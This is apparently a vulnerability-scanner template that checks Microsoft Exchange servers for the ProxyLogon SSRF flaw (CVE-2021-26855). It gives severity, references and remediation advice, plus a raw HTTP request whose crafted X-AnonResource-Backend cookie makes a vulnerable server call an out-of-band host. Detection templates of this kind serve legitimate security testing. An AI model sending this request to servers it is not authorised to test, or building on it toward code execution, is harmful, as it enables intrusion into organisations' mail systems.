id: CVE-2021-26855
info:
  name: Microsoft Exchange Server SSRF Vulnerability
  author: madrobot
  severity: critical
  description: CVE-2021-26855 is a SSRF vulnerability in Microsoft Exchange Server
    that could lead to remote code execution through an untrusted connection and a
    malicious file.
  reference:
  - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26855
  - https://proxylogon.com/#timeline
  - https://web.archive.org/web/20210306113850/https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
  - https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09
  remediation: Apply the appropriate security update.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-26855
  metadata:
    shodan-query: vuln:CVE-2021-26855
    impact: The Microsoft Exchange Server SSRF Vulnerability (CVE-2021-26855) poses
      a significant risk as it could potentially be used to enable remote code execution,
      compromising critical organizational data.
    recommendation: It is recommended to patch the Microsoft Exchange Server immediately
      to address the CVE-2021-26855 vulnerability and prevent potential remote code
      execution attacks.
  tags: cve,cve2021,ssrf,rce,exchange,oast,microsoft,kev
requests:
- raw:
  - 'GET /owa/auth/x.js HTTP/1.1

    Host: {{Hostname}}

    Cookie: X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;

    '
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
